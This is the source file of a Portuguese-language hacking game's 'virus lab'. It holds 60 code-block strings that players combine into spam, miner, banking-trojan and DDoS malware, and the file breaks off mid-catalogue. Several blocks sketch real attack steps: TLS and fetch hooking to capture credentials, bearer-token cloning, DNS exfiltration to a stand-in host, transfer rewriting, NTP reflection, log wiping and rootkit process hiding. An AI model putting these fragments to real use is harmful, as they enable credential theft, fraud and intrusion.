/**
 * ============================================================================
 * HACKER CITY — LABORATÓRIO DE VÍRUS (ENGENHARIA CEGA DE BLOCOS DE CÓDIGO)
 * ============================================================================
 * Mecânica oficial solicitada:
 * - Menu dedicado "Laboratório de Vírus" (em Meu Computador).
 * - 3 Rounds aleatórios por compilação (1 + 2 + 1 = 4 blocos de código):
 *     * Round 1: aparecem 3 opções aleatórias -> jogador escolhe APENAS 1.
 *     * Round 2: aparecem 3 novas opções aleatórias -> jogador escolhe EXATAMENTE 2.
 *     * Round 3: aparecem 3 novas opções aleatórias -> jogador escolhe APENAS 1.
 * - Mínimo de 60 blocos distintos de programação real (20 x C(24,2)=276 x 16 = 88.320 junções!).
 * - Durante os rounds o jogador vê APENAS os blocos puros de programação (sem spoilers),
 *   montando na intuição/leitura de código; na compilação o motor calcula o ENCAIXE
 *   (de F instável/fraco até S+ perfeito) e destrava mais de 50 Conjuntos (54 Conjuntos!).
 * - Progressão de Nível 1 até Nível 10 (Nível Máximo), liberando camadas mais fortes
 *   de código e conjuntos lendários até v10.0!
 * ============================================================================
 */
(function () {
  'use strict';

  const MAX_LAB_LEVEL = 10;

  // Tabela de progressão Nível 1 -> Nível 10 (Nível Máximo)
  // Cada nível eleva a camada desbloqueada (Tier 1..5) e o teto de versão compilável (v1.8 -> v10.0)
  const LAB_LEVEL_TABLE = [
    { level: 1, xpReq: 0,    maxTier: 1, maxVerInt: 18, title: 'Bancada Improvisada',       unlockNote: 'Camada I liberada (teto v1.8)' },
    { level: 2, xpReq: 90,   maxTier: 1, maxVerInt: 26, title: 'Montador de Scripts',       unlockNote: 'Otimizador Nv.2 (teto v2.6)' },
    { level: 3, xpReq: 220,  maxTier: 2, maxVerInt: 35, title: 'Escovador de Sockets',      unlockNote: 'Camada II liberada (teto v3.5)' },
    { level: 4, xpReq: 400,  maxTier: 2, maxVerInt: 45, title: 'Engenheiro de Payloads',    unlockNote: 'Linker Assíncrono (teto v4.5)' },
    { level: 5, xpReq: 640,  maxTier: 3, maxVerInt: 56, title: 'Arquiteto Polimórfico',     unlockNote: 'Camada III liberada (teto v5.6)' },
    { level: 6, xpReq: 950,  maxTier: 3, maxVerInt: 67, title: 'Especialista em Ring-3',    unlockNote: 'Ofuscador Nativo (teto v6.7)' },
    { level: 7, xpReq: 1340, maxTier: 4, maxVerInt: 78, title: 'Mestre de Exploração',      unlockNote: 'Camada IV liberada (teto v7.8)' },
    { level: 8, xpReq: 1820, maxTier: 4, maxVerInt: 88, title: 'Forjador de Rootkits',      unlockNote: 'Injeção Vetorial (teto v8.8)' },
    { level: 9, xpReq: 2400, maxTier: 5, maxVerInt: 95, title: 'Autor de Zero-Days',        unlockNote: 'Camada V Zero-Day liberada (teto v9.5)' },
    { level: 10, xpReq: 3100, maxTier: 5, maxVerInt: 100, title: 'Nível Máximo · Arquiteto Zero-Day', unlockNote: 'Teto Absoluto Liberado (v10.0 MÁXIMO)' }
  ];

  const VIRUS_FAMILY_META = {
    vspam:  { key: 'vspam',  filename: 'Spam.vspam',       label: 'Spam Mailer (.vspam)',       yieldDesc: 'Gera $ HC passivo disparando lotes SMTP' },
    vwarez: { key: 'vwarez', filename: 'Warez.vwarez',     label: 'Seeder Pirata (.vwarez)',    yieldDesc: 'Monetiza banda P2P/Torrent em $ HC' },
    vminer: { key: 'vminer', filename: 'Miner.vminer',     label: 'Minerador Cripto (.vminer)', yieldDesc: 'Minera satoshis de Bitcoin reais na CPU alvo' },
    vbank:  { key: 'vbank',  filename: 'BankTrojan.vbank', label: 'Trojan Bancário (.vbank)',   yieldDesc: 'Intercepta sessões e desvia % bancária' },
    vddos:  { key: 'vddos',  filename: 'DDoS_Node.vddos',  label: ' Escravo DDoS (.vddos)',     yieldDesc: 'Amplifica potência em Gbps nos ataques DDoS' }
  };

  // =========================================================================
  // ROUND 1 — 20 BLOCOS DE ENTRADA / ABERTURA DE DESCRITOR (Escolher 1 de 3)
  // =========================================================================
  const ROUND_1_BLOCKS = [
    // Canal: mail_pipe (afinidade natural com Spam)
    {
      id: 'R1_01', round: 1, tier: 1, lang: 'POSIX C', channel: 'mail_pipe', family: 'vspam',
      fn: 'int open_mx_relay(const char *host)',
      abi: 'ABI: fd_smtp -> text_pipe[512]',
      code: `int fd = socket(AF_INET, SOCK_STREAM, 0);\nconnect(fd, (struct sockaddr*)&mx25, sizeof(mx25));\nsend(fd, "EHLO relay.local\\r\\n", 18, 0);\nreturn fd;`
    },
    {
      id: 'R1_02', round: 1, tier: 2, lang: 'Python 3', channel: 'mail_pipe', family: 'vspam',
      fn: 'async def bind_dkim_spool(loop)',
      abi: 'ABI: coro_pipe -> mime_queue',
      code: `rd, wr = await asyncio.open_connection(mx_ip, 587)\nwr.write(b"STARTTLS\\r\\n")\nawait wr.drain()\nreturn (rd, wr)`
    },
    {
      id: 'R1_03', round: 1, tier: 3, lang: 'Rust', channel: 'mail_pipe', family: 'vspam',
      fn: 'fn hijack_MTA_unix_sock() -> RawFd',
      abi: 'ABI: unix_fd -> batch_envelope',
      code: `let s = UnixStream::connect("/var/spool/postfix/public/pickup")?;\ns.set_nonblocking(true)?;\nOk(s.into_raw_fd())`
    },
    {
      id: 'R1_04', round: 1, tier: 4, lang: 'C99', channel: 'mail_pipe', family: 'vspam',
      fn: 'void* mmap_mx_ring_tx(size_t slots)',
      abi: 'ABI: shm_mail -> zero_alloc_q',
      code: `void *ring = mmap(0, slots * 4096, PROT_READ|PROT_WRITE,\n                  MAP_SHARED|MAP_ANONYMOUS, -1, 0);\n*(uint32_t*)ring = 0x534D5450; /* SMTP */\nreturn ring;`
    },

    // Canal: p2p_chunk (afinidade natural com Warez)
    {
      id: 'R1_05', round: 1, tier: 1, lang: 'C99', channel: 'p2p_chunk', family: 'vwarez',
      fn: 'int dht_bootstrap_udp(uint16_t port)',
      abi: 'ABI: sock_dht -> piece_map[64]',
      code: `int u = socket(AF_INET, SOCK_DGRAM, IPPROTO_UDP);\nbind(u, (struct sockaddr*)&dht_addr, sizeof(dht_addr));\nsendto(u, "d1:q9:find_nodee", 16, 0, &boot, 16);\nreturn u;`
    },
    {
      id: 'R1_06', round: 1, tier: 2, lang: 'Rust', channel: 'p2p_chunk', family: 'vwarez',
      fn: 'fn peer_wire_handshake(ih: &[u8; 20])',
      abi: 'ABI: tcp_swarm -> bitfield_io',
      code: `let mut buf = [0u8; 68];\nbuf[0] = 19;\nbuf[1..20].copy_from_slice(b"BitTorrent protocol");\nbuf[28..48].copy_from_slice(ih);`
    },
    {
      id: 'R1_07', round: 1, tier: 3, lang: 'POSIX C', channel: 'p2p_chunk', family: 'vwarez',
      fn: 'int splice_iso_storage(int disk_fd)',
      abi: 'ABI: fd_blk -> pipe_splice_64k',
      code: `int pfd[2];\npipe(pfd);\nfcntl(pfd[1], F_SETPIPE_SZ, 1048576);\nsplice(disk_fd, NULL, pfd[1], NULL, 65536, SPLICE_F_MOVE);`
    },
    {
      id: 'R1_08', round: 1, tier: 4, lang: 'C++20', channel: 'p2p_chunk', family: 'vwarez',
      fn: 'utp_mux* init_utp_ledbat_bus()',
      abi: 'ABI: utp_ring -> swarm_slices',
      code: `auto *mux = new utp_mux{ .wnd_kb = 8192, .delay_us = 900 };\nmux->open_trackerless_mesh(0x1AE3);\nreturn mux;`
    },

    // Canal: simd_alu (afinidade natural com Miner)
    {
      id: 'R1_09', round: 1, tier: 1, lang: 'C99', channel: 'simd_alu', family: 'vminer',
      fn: 'void bind_worker_affinity(int core_id)',
      abi: 'ABI: cpu_pin -> alu_lane64',
      code: `cpu_set_t mask;\nCPU_ZERO(&mask);\nCPU_SET(core_id, &mask);\nsched_setaffinity(0, sizeof(mask), &mask);`
    },
    {
      id: 'R1_10', round: 1, tier: 2, lang: 'x86_64 ASM', channel: 'simd_alu', family: 'vminer',
      fn: 'align_ymm_scratchpad_256:',
      abi: 'ABI: ymm0..ymm7 -> hash_state',
      code: `mov rax, rsp\nand rsp, -32\nvpxor ymm0, ymm0, ymm0\nvmovdqa [rsp], ymm0`
    },
    {
      id: 'R1_11', round: 1, tier: 3, lang: 'POSIX C', channel: 'simd_alu', family: 'vminer',
      fn: 'void* alloc_2mb_hugepages(size_t n)',
      abi: 'ABI: huge_dag -> l3_cache_line',
      code: `void *dag = mmap(NULL, n * 2097152UL, PROT_READ|PROT_WRITE,\n                 MAP_PRIVATE|MAP_ANONYMOUS|MAP_HUGETLB, -1, 0);\nmadvise(dag, n * 2097152UL, MADV_WILLNEED);\nreturn dag;`
    },
    {
      id: 'R1_12', round: 1, tier: 5, lang: 'x86_64 ASM', channel: 'simd_alu', family: 'vminer',
      fn: 'init_avx512_sha_ni_lanes:',
      abi: 'ABI: zmm0..zmm15 -> sha_ni_pipe',
      code: `vpternlogd zmm1, zmm2, zmm3, 0x96\nsha256rnds2 xmm0, xmm1\nprefetcht0 [rdi + 128]\nret`
    },

    // Canal: tls_mem (afinidade natural com BankTrojan)
    {
      id: 'R1_13', round: 1, tier: 1, lang: 'POSIX C', channel: 'tls_mem', family: 'vbank',
      fn: 'void* hook_got_ssl_write(void *sym)',
      abi: 'ABI: plt_got -> tls_plain_buf',
      code: `void *h = dlopen("libssl.so.3", RTLD_LAZY);\norig_ssl_write = dlsym(h, "SSL_write");\nmprotect(got_page, 4096, PROT_READ|PROT_WRITE);\n*got_slot = sym;`
    },
    {
      id: 'R1_14', round: 1, tier: 2, lang: 'JavaScript', channel: 'tls_mem', family: 'vbank',
      fn: 'function wrapFetchCredentials(win)',
      abi: 'ABI: dom_hook -> json_payload',
      code: `const _f = win.fetch;\nwin.fetch = async (u, opt = {}) => {\n  if (opt.body) tapChannel.push([u, opt.body]);\n  return _f.call(win, u, opt);\n};`
    },
    {
      id: 'R1_15', round: 1, tier: 4, lang: 'C99', channel: 'tls_mem', family: 'vbank',
      fn: 'long ptrace_attach_browser_heap(pid_t p)',
      abi: 'ABI: vm_readv -> session_key_ptr',
      code: `struct iovec loc = { buf, 4096 }, rem = { heap_va, 4096 };\nreturn process_vm_readv(p, &loc, 1, &rem, 1, 0);`
    },
    {
      id: 'R1_16', round: 1, tier: 5, lang: 'Rust', channel: 'tls_mem', family: 'vbank',
      fn: 'unsafe fn uprobe_nss_pr_write(ctx: *mut PtRegs)',
      abi: 'ABI: uprobe_tls -> clear_iban_frame',
      code: `let buf_ptr = (*ctx).rsi as *const u8;\nlet len = ((*ctx).rdx as usize).min(2048);\nslice::from_raw_parts(buf_ptr, len)`
    },

    // Canal: raw_pkt (afinidade natural com DDoS)
    {
      id: 'R1_17', round: 1, tier: 1, lang: 'POSIX C', channel: 'raw_pkt', family: 'vddos',
      fn: 'int open_raw_ip_hdrincl(void)',
      abi: 'ABI: sock_raw -> ipv4_frame',
      code: `int s = socket(AF_INET, SOCK_RAW, IPPROTO_RAW);\nint one = 1;\nsetsockopt(s, IPPROTO_IP, IP_HDRINCL, &one, sizeof(one));\nreturn s;`
    },
    {
      id: 'R1_18', round: 1, tier: 2, lang: 'C99', channel: 'raw_pkt', family: 'vddos',
      fn: 'int bind_packet_tx_ring(int ifindex)',
      abi: 'ABI: tpacket_v3 -> nic_tx_queue',
      code: `struct tpacket_req3 req = { .tp_block_size = 65536, .tp_block_nr = 32 };\nint fd = socket(AF_PACKET, SOCK_RAW, 0);\nsetsockopt(fd, SOL_PACKET, PACKET_TX_RING, &req, sizeof(req));\nreturn fd;`
    },
    {
      id: 'R1_19', round: 1, tier: 4, lang: 'C99', channel: 'raw_pkt', family: 'vddos',
      fn: 'int xsk_umem_zero_copy(void *umem)',
      abi: 'ABI: af_xdp -> umem_desc_ring',
      code: `struct xdp_umem_reg mr = { .addr = (uint64_t)umem, .len = 1<<22,\n                           .chunk_size = 2048 };\nsetsockopt(xsk_fd, SOL_XDP, XDP_UMEM_REG, &mr, sizeof(mr));`
    },
    {
      id: 'R1_20', round: 1, tier: 5, lang: 'Rust', channel: 'raw_pkt', family: 'vddos',
      fn: 'fn map_pci_ixgbe_tx_doorbell(bar0: *mut u32)',
      abi: 'ABI: mmio_tx -> line_rate_burst',
      code: `unsafe {\n  core::ptr::write_volatile(bar0.add(0x6018 / 4), tail_idx);\n  core::arch::x86_64::_mm_sfence();\n}`
    }
  ];

  // =========================================================================
  // ROUND 2 — 24 BLOCOS DE NÚCLEO / PAYLOAD (Escolher EXATAMENTE 2 de 3)
  // C(24, 2) = 276 pares possíveis no Round 2!
  // =========================================================================
  const ROUND_2_BLOCKS = [
    // 4 blocos mail_pipe (Spam)
    {
      id: 'R2_01', round: 2, tier: 1, lang: 'C99', channel: 'mail_pipe', family: 'vspam', subRole: 'generator',
      fn: 'size_t build_mime_multipart(char *out, int id)',
      abi: 'ABI: text_pipe -> mime_body',
      code: `return snprintf(out, 512, "From: noreply@node%d\\r\\n"\n  "Content-Type: multipart/alternative\\r\\n\\r\\n%s", id, body);`
    },
    {
      id: 'R2_02', round: 2, tier: 2, lang: 'Python 3', channel: 'mail_pipe', family: 'vspam', subRole: 'dispatcher',
      fn: 'def spray_rcpt_batch(wr, rcpt_list):',
      abi: 'ABI: mime_queue -> pipelined_rcpt',
      code: `blob = "".join(f"RCPT TO:<{a}>\\r\\n" for a in rcpt_list[:64])\nwr.write(blob.encode("ascii") + b"DATA\\r\\n")`
    },
    {
      id: 'R2_03', round: 2, tier: 3, lang: 'Rust', channel: 'mail_pipe', family: 'vspam', subRole: 'mutator',
      fn: 'fn mutate_helo_spf_tokens(seed: u64) -> String',
      abi: 'ABI: batch_envelope -> polymorphic_hdr',
      code: `let tok = seed.wrapping_mul(0x9E3779B97F4A7C15);\nformat!("Message-ID: <{:016x}@mx-edge.net>\\r\\n", tok)`
    },
    {
      id: 'R2_04', round: 2, tier: 5, lang: 'C99', channel: 'mail_pipe', family: 'vspam', subRole: 'dispatcher',
      fn: 'int sendmmsg_smtp_pipeline(int fd, struct mmsghdr *v)',
      abi: 'ABI: zero_alloc_q -> kernel_smtp_burst',
      code: `for (int i = 0; i < 128; i++) v[i].msg_hdr.msg_Flags = MSG_MORE;\nreturn sendmmsg(fd, v, 128, MSG_DONTWAIT);`
    },

    // 4 blocos p2p_chunk (Warez)
    {
      id: 'R2_05', round: 2, tier: 1, lang: 'C99', channel: 'p2p_chunk', family: 'vwarez', subRole: 'dispatcher',
      fn: 'ssize_t seed_piece_16k(int peer_fd, int idx)',
      abi: 'ABI: piece_map -> swarm_upload',
      code: `uint32_t hdr[3] = { htonl(16393), htonl(7), htonl(idx) };\nsend(peer_fd, hdr, 12, MSG_MORE);\nreturn sendfile(peer_fd, iso_fd, &off, 16384);`
    },
    {
      id: 'R2_06', round: 2, tier: 2, lang: 'Rust', channel: 'p2p_chunk', family: 'vwarez', subRole: 'mutator',
      fn: 'fn rarest_first_bitfield_xor(bf: &mut [u8])',
      abi: 'ABI: bitfield_io -> super_seed_mask',
      code: `for byte in bf.iter_mut() {\n  *byte = byte.rotate_left(3) ^ 0xA5;\n}`
    },
    {
      id: 'R2_07', round: 2, tier: 3, lang: 'C++20', channel: 'p2p_chunk', family: 'vwarez', subRole: 'generator',
      fn: 'voidreed_solomon_parity_shard(uint8_t *blk)',
      abi: 'ABI: pipe_splice_64k -> fec_shards',
      code: `for (size_t i = 0; i < 65536; i += 64)\n  gf256_mul_acc(&parity[i], &blk[i], 0x1D);`
    },
    {
      id: 'R2_08', round: 2, tier: 5, lang: 'POSIX C', channel: 'p2p_chunk', family: 'vwarez', subRole: 'dispatcher',
      fn: 'int io_uring_prep_send_zc_swarm(struct io_uring *r)',
      abi: 'ABI: swarm_slices -> zero_copy_seed',
      code: `struct io_uring_sqe *sqe = io_uring_get_sqe(r);\nio_uring_prep_send_zc(sqe, peer_fd, chunk_ptr, 65536, 0, 0);\nreturn io_uring_submit(r);`
    },

    // 4 blocos simd_alu (Miner)
    {
      id: 'R2_09', round: 2, tier: 1, lang: 'C99', channel: 'simd_alu', family: 'vminer', subRole: 'generator',
      fn: 'uint32_t grind_sha256d_nonce(uint32_t *hdr)',
      abi: 'ABI: alu_lane64 -> digest_u256',
      code: `for (uint32_t n = 0; n < 0xFFFF; n++) {\n  hdr[19] = n;\n  if (sha256d_lead_zeros(hdr) >= 22) return n;\n}\nreturn 0;`
    },
    {
      id: 'R2_10', round: 2, tier: 2, lang: 'C99', channel: 'simd_alu', family: 'vminer', subRole: 'dispatcher',
      fn: 'int stratum_submit_share(int sfd, uint32_t nonce)',
      abi: 'ABI: hash_state -> json_rpc_share',
      code: `char req[192];\nint n = snprintf(req, 192, "{\\"method\\":\\"mining.submit\\",\\"nonce\\":\\"%08x\\"}\\n", nonce);\nreturn send(sfd, req, n, MSG_NOSIGNAL);`
    },
    {
      id: 'R2_11', round: 2, tier: 4, lang: 'x86_64 ASM', channel: 'simd_alu', family: 'vminer', subRole: 'mutator',
      fn: 'aesni_scratchpad_mix_4way:',
      abi: 'ABI: l3_cache_line -> randomx_mix',
      code: `movdqa xmm2, [rdi]\naesenc xmm2, xmm3\naesenc xmm2, [rsi + rax*8]\nmovdqa [rdi], xmm2`
    },
    {
      id: 'R2_12', round: 2, tier: 5, lang: 'x86_64 ASM', channel: 'simd_alu', family: 'vminer', subRole: 'generator',
      fn: 'avx512_8way_midstate_unroll:',
      abi: 'ABI: sha_ni_pipe -> 8x_nonce_hit',
      code: `vpaddd zmm4, zmm0, [rip + k256_vec]\nvprord zmm5, zmm4, 7\nvpxord zmm6, zmm5, zmm1`
    },

    // 4 blocos tls_mem (BankTrojan)
    {
      id: 'R2_13', round: 2, tier: 1, lang: 'C99', channel: 'tls_mem', family: 'vbank', subRole: 'generator',
      fn: 'int scan_iban_swift_frame(const char *buf, size_t n)',
      abi: 'ABI: tls_plain_buf -> acct_match',
      code: `const char *p = memmem(buf, n, "transfer_to=", 12);\nif (!p) return 0;\nmemcpy(captured_acct, p + 12, 16);\nreturn 1;`
    },
    {
      id: 'R2_14', round: 2, tier: 2, lang: 'JavaScript', channel: 'tls_mem', family: 'vbank', subRole: 'mutator',
      fn: 'function rewriteWirePayload(jsonBody, shadowAcc)',
      abi: 'ABI: json_payload -> shadow_split',
      code: `const tx = JSON.parse(jsonBody);\ntx.mirrorFee = +(tx.amount * 0.15).toFixed(2);\ntx.routeMirror = shadowAcc;\nreturn JSON.stringify(tx);`
    },
    {
      id: 'R2_15', round: 2, tier: 4, lang: 'Rust', channel: 'tls_mem', family: 'vbank', subRole: 'dispatcher',
      fn: 'fn splice_jwt_bearer_cookie(hdrs: &mut Vec<u8>)',
      abi: 'ABI: session_key_ptr -> auth_token_clone',
      code: `if let Some(pos) = twoway::find_bytes(hdrs, b"Authorization: Bearer ") {\n  exfil_ring_push(&hdrs[pos + 22 .. pos + 86]);\n}`
    },
    {
      id: 'R2_16', round: 2, tier: 5, lang: 'C99', channel: 'tls_mem', family: 'vbank', subRole: 'mutator',
      fn: 'void hotpatch_hmac_tag_in_ram(uint8_t *frame)',
      abi: 'ABI: clear_iban_frame -> valid_mac_forge',
      code: `recompute_sha256_hmac(session_secret, frame, 128, frame + 128);\n__builtin___clear_cache((char*)frame, (char*)frame + 160);`
    },

    // 4 blocos raw_pkt (DDoS)
    {
      id: 'R2_17', round: 2, tier: 1, lang: 'C99', channel: 'raw_pkt', family: 'vddos', subRole: 'generator',
      fn: 'void forge_tcp_syn_hdr(struct tcphdr *th, uint16_t dp)',
      abi: 'ABI: ipv4_frame -> syn_burst_hdr',
      code: `th->source = htons(rand16());\nth->dest = htons(dp);\nth->syn = 1;\nth->window = htons(64240);`
    },
    {
      id: 'R2_18', round: 2, tier: 2, lang: 'C99', channel: 'raw_pkt', family: 'vddos', subRole: 'mutator',
      fn: 'uint16_t csum_ipv4_fold_fast(const uint16_t *p)',
      abi: 'ABI: nic_tx_queue -> hw_csum_ready',
      code: `uint32_t sum = p[0] + p[1] + p[2] + p[3] + p[4];\nsum = (sum >> 16) + (sum & 0xFFFF);\nreturn (uint16_t)~(sum + (sum >> 16));`
    },
    {
      id: 'R2_19', round: 2, tier: 3, lang: 'C99', channel: 'raw_pkt', family: 'vddos', subRole: 'dispatcher',
      fn: 'int udp_ntp_monlist_reflect(int s, struct sockaddr *v)',
      abi: 'ABI: umem_desc_ring -> amp_pulse',
      code: `static const uint8_t ntp_mon[8] = { 0x17, 0x00, 0x03, 0x2a, 0, 0, 0, 0 };\nreturn sendto(s, ntp_mon, 8, MSG_DONTWAIT, v, 16);`
    },
    {
      id: 'R2_20', round: 2, tier: 5, lang: 'x86_64 ASM', channel: 'raw_pkt', family: 'vddos', subRole: 'dispatcher',
      fn: 'tx_ring_burst_64_descriptors:',
      abi: 'ABI: line_rate_burst -> 64x_wire_pkt',
      code: `mov ecx, 64\n.loop_pkt:\nvmovdqa [rdi + rcx*32], ymm7\nloop .loop_pkt`
    },

    // 4 blocos transversais (2 Otimizadores Universais + 1 Armadilha de Bloqueio + 1 Amplificador Tier-5)
    {
      id: 'R2_21', round: 2, tier: 2, lang: 'POSIX C', channel: 'universal_boost', family: 'any', subRole: 'booster',
      fn: 'int epoll_edge_multiplex(int epfd, int fd)',
      abi: 'ABI: any_fd -> async_nonblock_mux',
      code: `struct epoll_event ev = { .events = EPOLLOUT | EPOLLET, .data.fd = fd };\nfcntl(fd, F_SETFL, O_NONBLOCK);\nreturn epoll_ctl(epfd, EPOLL_CTL_ADD, fd, &ev);`
    },
    {
      id: 'R2_22', round: 2, tier: 3, lang: 'C99', channel: 'universal_boost', family: 'any', subRole: 'booster',
      fn: 'void lockfree_spsc_push(ring_t *q, void *item)',
      abi: 'ABI: any_bus -> lockfree_l1_ring',
      code: `size_t w = atomic_load_explicit(&q->head, memory_order_relaxed);\nq->slots[w & q->mask] = item;\natomic_store_explicit(&q->head, w + 1, memory_order_release);`
    },
    {
      id: 'R2_23', round: 2, tier: 1, lang: 'POSIX C', channel: 'sync_stall', family: 'trap', subRole: 'stall_trap',
      fn: 'void serialized_debug_barrier(pthread_mutex_t *m)',
      abi: 'ABI: global_lock -> sleep_sync_2s',
      code: `pthread_mutex_lock(m);\nfsync(STDERR_FILENO);\nsleep(2); /* aguarda flush síncrono */\npthread_mutex_unlock(m);`
    },
    {
      id: 'R2_24', round: 2, tier: 5, lang: 'Rust', channel: 'universal_boost', family: 'any', subRole: 'hyper_jit',
      fn: 'unsafe fn jit_emit_native_trampoline(code: &[u8])',
      abi: 'ABI: any_lane -> rwx_jit_turbo',
      code: `let mem = mmap(ptr::null_mut(), 4096, PROT_READ|PROT_WRITE|PROT_EXEC,\n               MAP_PRIVATE|MAP_ANON, -1, 0);\nptr::copy_nonoverlapping(code.as_ptr(), mem as *mut u8, code.len());`
    }
  ];

  // =========================================================================
  // ROUND 3 — 16 BLOCOS DE FECHAMENTO / PERSISTÊNCIA & EVASÃO (Escolher 1 de 3)
  // 20 * 276 * 16 = 88.320 combinações totais!
  // =========================================================================
  const ROUND_3_BLOCKS = [
    // mail_pipe (Spam)
    {
      id: 'R3_01', round: 3, tier: 1, lang: 'Bash/Sys', channel: 'mail_pipe', family: 'vspam',
      fn: 'cleanup_mailq_footprints()',
      abi: 'ABI: mime_body -> clean_quit_221',
      code: `printf "QUIT\\r\\n" >&3\nsed -i '/relay\\.local/d' /var/log/mail.log 2>/dev/null\nexec 3>&-`
    },
    {
      id: 'R3_02', round: 3, tier: 3, lang: 'C99', channel: 'mail_pipe', family: 'vspam',
      fn: 'void rotate_ptr_ehlo_daemon(void)',
      abi: 'ABI: polymorphic_hdr -> cron_respawn',
      code: `prctl(PR_SET_NAME, "[kworker/u4:1]", 0, 0, 0);\nclose(STDIN_FILENO);\ndaemon(1, 0);`
    },
    {
      id: 'R3_03', round: 3, tier: 5, lang: 'Rust', channel: 'mail_pipe', family: 'vspam',
      fn: 'fn seal_dkim_ghost_queue(fd: RawFd)',
      abi: 'ABI: kernel_smtp_burst -> stealth_mta_hook',
      code: `unsafe { libc::setsockopt(fd, libc::SOL_SOCKET, libc::SO_LINGER, &linger, 8); }\nstd::fs::remove_file("/tmp/.mta_spool.lock").ok();`
    },

    // p2p_chunk (Warez)
    {
      id: 'R3_04', round: 3, tier: 1, lang: 'C99', channel: 'p2p_chunk', family: 'vwarez',
      fn: 'void mask_upnp_port_lease(uint16_t port)',
      abi: 'ABI: swarm_upload -> stealth_dht_close',
      code: `shutdown(dht_sock, SHUT_RD);\nmemset(peer_id_buf, 0, 20);\nmemcpy(peer_id_buf, "-TR3000-", 8);`
    },
    {
      id: 'R3_05', round: 3, tier: 3, lang: 'Rust', channel: 'p2p_chunk', family: 'vwarez',
      fn: 'fn encrypt_mse_rc4_stream(s: &mut [u8])',
      abi: 'ABI: fec_shards -> obfuscated_torrent',
      code: `for (i, b) in s.iter_mut().enumerate() {\n  *b ^= ((i as u8).wrapping_mul(73)).rotate_right(2);\n}`
    },
    {
      id: 'R3_06', round: 3, tier: 5, lang: 'POSIX C', channel: 'p2p_chunk', family: 'vwarez',
      fn: 'void memfd_anon_seeder_resident(void)',
      abi: 'ABI: zero_copy_seed -> fileless_ram_iso',
      code: `int mfd = memfd_create("ksysguardd", MFD_CLOEXEC);\nfexecve(mfd, (char *const[]){"[ext4-rsv]", NULL}, environ);`
    },

    // simd_alu (Miner)
    {
      id: 'R3_07', round: 3, tier: 1, lang: 'POSIX C', channel: 'simd_alu', family: 'vminer',
      fn: 'void throttle_on_top_scan(void)',
      abi: 'ABI: digest_u256 -> idle_nice_19',
      code: `setpriority(PRIO_PROCESS, 0, 19);\nif (access("/proc/sys/kernel/sched_autogroup_enabled", R_OK) == 0)\n  usleep(15000);`
    },
    {
      id: 'R3_08', round: 3, tier: 3, lang: 'C99', channel: 'simd_alu', family: 'vminer',
      fn: 'void zeroize_avx_thermal_spike(void)',
      abi: 'ABI: randomx_mix -> thermal_cloak',
      code: `_mm256_zeroall();\nsched_yield();\nprctl(PR_SET_TIMERSLACK, 50000L);`
    },
    {
      id: 'R3_09', round: 3, tier: 5, lang: 'x86_64 ASM', channel: 'simd_alu', family: 'vminer',
      fn: 'pmc_hide_cycles_vzeroall:',
      abi: 'ABI: 8x_nonce_hit -> ghost_msr_seal',
      code: `vzeroall\nxor eax, eax\ncpuid\nret`
    },

    // tls_mem (BankTrojan)
    {
      id: 'R3_10', round: 3, tier: 1, lang: 'C99', channel: 'tls_mem', family: 'vbank',
      fn: 'void restore_got_page_ro(void **slot, void *orig)',
      abi: 'ABI: acct_match -> clean_got_unhook',
      code: `*slot = orig;\nmprotect((void*)((uintptr_t)slot & ~4095UL), 4096, PROT_READ);\nexplicit_bzero(captured_acct, 16);`
    },
    {
      id: 'R3_11', round: 3, tier: 3, lang: 'Rust', channel: 'tls_mem', family: 'vbank',
      fn: 'fn covert_doh_exfil_flush(frame: &[u8])',
      abi: 'ABI: auth_token_clone -> dns_https_tunnel',
      code: `let b64 = base64_url_encode(frame);\nsend_doh_txt_query(&format!("{}.cdn-metrics.example", b64));`
    },
    {
      id: 'R3_12', round: 3, tier: 5, lang: 'C99', channel: 'tls_mem', family: 'vbank',
      fn: 'void sgx_enclave_wipe_traces(void *ctx)',
      abi: 'ABI: valid_mac_forge -> zero_forensic_ram',
      code: `explicit_bzero(ctx, 512);\nmunlockall();\n__asm__ volatile("" ::: "memory");`
    },

    // raw_pkt (DDoS)
    {
      id: 'R3_13', round: 3, tier: 1, lang: 'C99', channel: 'raw_pkt', family: 'vddos',
      fn: 'void spoof_ip_id_ttl_jitter(struct iphdr *ip)',
      abi: 'ABI: syn_burst_hdr -> decoy_src_seal',
      code: `ip->ttl = 52 + (rand8() & 0x0F);\nip->id = htons(rand16());\nip->saddr = decoy_subnet_pool[rand8() & 31];`
    },
    {
      id: 'R3_14', round: 3, tier: 3, lang: 'POSIX C', channel: 'raw_pkt', family: 'vddos',
      fn: 'int bpf_hide_raw_socket_diag(int sock_fd)',
      abi: 'ABI: amp_pulse -> netstat_cloak',
      code: `int mark = 0x7F00D;\nreturn setsockopt(sock_fd, SOL_SOCKET, SO_MARK, &mark, sizeof(mark));`
    },
    {
      id: 'R3_15', round: 3, tier: 5, lang: 'C99', channel: 'raw_pkt', family: 'vddos',
      fn: 'void detach_xdp_drv_clean(int ifindex)',
      abi: 'ABI: 64x_wire_pkt -> phantom_nic_reset',
      code: `bpf_set_link_xdp_fd(ifindex, -1, XDP_FLAGS_DRV_MODE);\nclose(xsk_fd);`
    },

    // Fechamento Lendário Universal Camada V
    {
      id: 'R3_16', round: 3, tier: 5, lang: 'x86_64 ASM', channel: 'universal_cloak', family: 'any',
      fn: 'ring0_dkom_unlink_task_struct:',
      abi: 'ABI: any_seal -> invisible_kernel_pid',
      code: `mov rax, [rdi + 0x298] ; tasks.next\nmov rdx, [rdi + 0x2A0] ; tasks.prev\nmov [rdx], rax\nmov [rax + 8], rdx`
    }
  ];

  const ALL_BLOCKS = [...ROUND_1_BLOCKS, ...ROUND_2_BLOCKS, ...ROUND_3_BLOCKS];
  const BLOCK_BY_ID = new Map(ALL_BLOCKS.map((b) => [b.id, b]));

  // =========================================================================
  // CATÁLOGO DE 54 CONJUNTOS SECRETOS DE SINERGIA (Mais de 50 Conjuntos!)
  // =========================================================================
  function build54SynergySets() {
    const sets = [
      // 01..10: Família Spam (.vspam)
      { id: 'SET_01', num: 1,  family: 'vspam', minTier: 1, bonusMult: 1.08, name: 'Relay Fantasma Porta 25',      desc: 'Túnel SMTP clássico com montagem MIME leve e encerramento limpo.' },
      { id: 'SET_02', num: 2,  family: 'vspam', minTier: 1, bonusMult: 1.11, name: 'Enxame MIME Assíncrono',       desc: 'Fila de destinatários em lote acoplada a multiplexador não-bloqueante.' },
